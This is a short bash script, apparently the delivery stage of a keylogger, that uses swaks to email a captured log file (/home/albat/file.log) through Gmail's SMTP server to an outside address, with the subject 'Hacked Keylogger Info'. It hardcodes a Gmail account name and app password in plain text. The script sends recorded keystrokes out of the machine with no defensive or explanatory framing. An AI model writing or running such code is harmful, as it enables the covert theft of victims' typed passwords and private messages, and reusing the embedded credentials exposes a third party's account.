#!/bin/bash
echo "This is the message body" | swaks --to albatujani@gmail.com --from "gullibletester@gmail.com" --server smtp.gmail.com --auth LOGIN --auth-user "gullibletester@gmail.com" --auth-password "hrwcaxudgqmzjjhl" -tls -p 587 --body "Your daily keylogger delivery is here" --header "Subject:Hacked Keylogger Info" --attach /home/albat/file.log
